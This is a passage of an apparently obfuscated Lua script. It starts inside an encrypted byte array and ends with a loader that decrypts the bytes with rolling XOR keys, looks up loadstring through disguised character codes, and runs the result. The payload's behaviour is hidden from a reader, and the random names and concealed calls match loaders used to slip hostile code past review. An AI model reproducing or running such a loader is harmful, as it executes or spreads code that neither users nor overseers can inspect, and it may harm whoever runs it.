235,144,199,79,127,46,177,194,1,99,222,11,202,166,140,104,92,198,251,183,223,196,20,91,175,46,235,138,119,184,249,6,218,235,209,190,35,13,78,148,96,21,254,150,32,92,11,172,127,223,145,216,51,56,103,255,254,53,215,47,55,39,177,158,5,66,23,145,180,113,62,203,128,45,8,181,54,6,61,31,63,159,219,103,245,142,177,98,207,205,232,245,183,51,180,137,244,217,223,6,103,177,61,7,65,227,30,75,138,166,241,26,116,246,224,161,183,191,120,200,43,120,31,128,173,156,254,207,195,149,201,12,120,125,163,180,8,177,152,78,249,194,243,154,119,212,237,174,248,15,60,96,252,63,29,175,60,183,195,68,185,28,220,132,97,47,177,180,121,255,154,116,49,79,32,228,57,220,153,228,1,207,60,244,249,60,223,55,57,28,251,222,40,30,205,137,187,123,112,48,75,69,208,254,252,205,205,44,54,151,134,39,186,124,122,57,52,140,227,244,119,220,0,128,245,218,204,78,181,232,113,126,58,236,201,178,228,166,248,25,119,143,224,208,179,186,122,244,232,141,233,110,118,156,9,8,235,152,223,88,51,106,121,253,182,161,213,214,227,202,249,221,102,209,209,162,57,48,198,183,162,12,227,250,114,220,128,0,245,218,166,144,112,240,123,109,137,56,140,33,243,129,56,232,11,19,222,238,240,195,44,56,167,15,144,116,56,221,242,218,60,172,224,150,75,103,39,128,80,91,213,214,32,28,245,34,8,218,227,44,240,189,123,53,232,240,212,251,114,220,3,143,134,218,196,76,163,233,112,126,1,186,203,120,227,27,254,222,177,215,44,155,66,184,134,179,58,128}
local UmXPjkKP,HQxaDrAr=182,158
local pGHrMzqN={}
for vPQyuJtU=1,#MOGXrtfu do
  local QeHqrQpi=MOGXrtfu[vPQyuJtU]
  QeHqrQpi=bit32.bxor(QeHqrQpi,HQxaDrAr)
  QeHqrQpi=(QeHqrQpi-UmXPjkKP+256)%256
  pGHrMzqN[vPQyuJtU]=string.char(QeHqrQpi)
  UmXPjkKP=(UmXPjkKP*13+7)%256;HQxaDrAr=(HQxaDrAr*17+11)%256
end
local _L = rawget(_G, string.char(108,111,97,100,115,116,114,105,110,103)) or rawget(_G,"load")
local _F, _E = _L(table.concat(pGHrMzqN))
if _F then _F() else warn(tostring(_E)) end
